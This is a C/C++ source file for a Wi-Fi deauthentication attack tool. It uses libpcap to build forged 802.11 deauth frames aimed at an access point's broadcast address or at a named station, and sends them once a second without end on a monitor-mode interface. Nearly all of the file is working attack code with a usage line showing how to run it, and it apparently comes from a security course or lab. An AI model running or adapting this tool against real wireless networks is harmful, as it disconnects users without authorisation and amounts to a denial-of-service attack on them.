#include <netinet/in.h>
#include <pcap.h>
#include <string.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdlib.h>
#include <list>
#include <map>
#include <string>
#include <unistd.h>

#include <iostream>

#include "deauth-attack.h"

void usage() {
	printf("syntax : deauth-attack <interface> <ap mac> [<station mac>] [-auth]\n");
	printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void DumpHex(const void* data, int size) {
  char ascii[17];
  int i, j;
  ascii[16] = '\0';
  for (i = 0; i < size; ++i) {
    printf("%02X ", ((unsigned char*)data)[i]);
    if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
      ascii[i % 16] = ((unsigned char*)data)[i];
    } else {
      ascii[i % 16] = '.';
    }
    if ((i+1) % 8 == 0 || i+1 == size) {
      printf(" ");
      if ((i+1) % 16 == 0) {
        printf("|  %s \n", ascii);
      } else if (i+1 == size) {
        ascii[(i+1) % 16] = '\0';
        if ((i+1) % 16 <= 8) {
          printf(" ");
        }
        for (j = (i+1) % 16; j < 16; ++j) {
          printf("   ");
        }
        printf("|  %s \n", ascii);
      }
    }
  }
}

bool parse(Param* param, int argc, char* argv[]) {
	if (argc < 3) {
		usage();
		return false;
	}
	param->dev_ = argv[1];
	param->ap_mac_ = argv[2];
	param->station_mac_ = argv[3];
	if(argc == 5)
		param->auth_ = true;
	return true;
}

int main(int argc, char* argv[]) {
	if (!parse(&param, argc, argv))
		return -1;

	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* pcap = pcap_open_live(param.dev_, BUFSIZ, 1, 1000, errbuf);
	if (pcap == NULL) {
		fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
		return -1;
	}
	
	while (true) {
		u_char* packet = NULL;
		struct ieee80211_radiotap_hdr radiotab;
		struct ieee80211_deauth_hdr deauth;

		u_char radiotab_dummy[] = {0x00, 0x00, 0x0b, 0x00, 0x00, 0x80, 0x02, 0x00, 0x00, 0x00, 0x00};
		memcpy(&radiotab, radiotab_dummy, 11);
		
		
		deauth.version = 0;
		deauth.frame_type = 0;
		deauth.frame_subtype = 12;
		deauth.flag = 0;
		deauth.duration = 0;
		
		u_char ap_mac[6];
		u_char station_mac[6];

		sscanf(param.ap_mac_, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", 
				&ap_mac[0], 
				&ap_mac[1], 
				&ap_mac[2], 
				&ap_mac[3], 
				&ap_mac[4], 
				&ap_mac[5]);
		
		if(argc < 4){
			memset(&deauth.addr1, 0xff, IEEE802_11_MAC_LENGTH);
                        memcpy(&deauth.addr2, ap_mac, IEEE802_11_MAC_LENGTH);
		}
		else{
			sscanf(param.station_mac_, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
                                        &station_mac[0],
                                        &station_mac[1],
                                        &station_mac[2],
                                        &station_mac[3],
                                        &station_mac[4],
                                        &station_mac[5]);

			if(argc == 4){
				memcpy(&deauth.addr1, station_mac, IEEE802_11_MAC_LENGTH);
	                        memcpy(&deauth.addr2, ap_mac, IEEE802_11_MAC_LENGTH);

			}
			else if(argc == 5){
				memcpy(&deauth.addr1, ap_mac, IEEE802_11_MAC_LENGTH);
	                        memcpy(&deauth.addr2, station_mac, IEEE802_11_MAC_LENGTH);
			}
		}
		/*
			memset(&deauth.addr1, 0xff, IEEE802_11_MAC_LENGTH);
			memcpy(&deauth.addr2, ap_mac, IEEE802_11_MAC_LENGTH);
		*/
		memcpy(&deauth.addr3, ap_mac, IEEE802_11_MAC_LENGTH);
		
		deauth.numbers = 0;
		deauth.fix.reason_code = 0x700;
		packet = (u_char*)malloc(sizeof(radiotab)+sizeof(deauth));

		memcpy(packet, &radiotab, sizeof(radiotab));
		memcpy(packet+sizeof(radiotab), &deauth, sizeof(deauth));

		if(pcap_sendpacket(pcap, packet, sizeof(radiotab)+sizeof(deauth)) != 0){
			fprintf(stderr, "pcap_sendpacket(%s) error\n", param.dev_);
		}
		
		free(packet);
		printf("send packet\n");
		sleep(1);
	}
		
	
	pcap_close(pcap);
}
